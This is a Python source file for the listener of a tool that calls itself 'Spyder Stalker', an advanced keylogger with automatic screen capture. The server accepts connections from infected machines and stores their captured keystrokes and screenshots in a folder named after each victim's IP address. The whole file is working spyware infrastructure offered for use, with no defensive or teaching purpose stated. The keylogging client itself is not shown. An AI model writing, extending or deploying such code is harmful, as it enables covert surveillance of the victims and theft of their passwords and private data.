import socket
import os
import threading
import pyfiglet

# Create directory if it doesn't exist
def create_client_directory(client_ip):
    os.makedirs(f"Captured/{client_ip}", exist_ok=True)

# Handle client data (both text & image)
def handle_client(conn, addr):
    client_ip = addr[0]
    create_client_directory(client_ip)  # Ensure directory exists

    try:
        data_type = conn.recv(1024).decode(errors="ignore")

        if data_type == "text":
            keylog = conn.recv(4096).decode(errors="ignore")
            with open(f"Captured/{client_ip}/{client_ip}.txt", "a") as file:
                file.write(keylog)

        elif data_type == "image":
            with open(f"Captured/{client_ip}/Received_Image.png", "wb") as f:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    f.write(data)

    except Exception as e:
        print(f"[ERROR] Client {client_ip} disconnected unexpectedly: {e}")

    finally:
        conn.close()  # Close connection


# Server setup
def start_server():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(pyfiglet.figlet_format("Spyder Stalker"))
    print("======= An advanced keylogging tool with auto screen capturing mechanism =======\n")

    host = input("Enter IP Address: ")
    port = int(input("Enter Port Number: "))

    soc.bind((host, port))
    soc.listen()

    print(f"Listening on {host}:{port} ...\n")

    while True:
        conn, addr = soc.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()


if __name__ == "__main__":
    start_server()
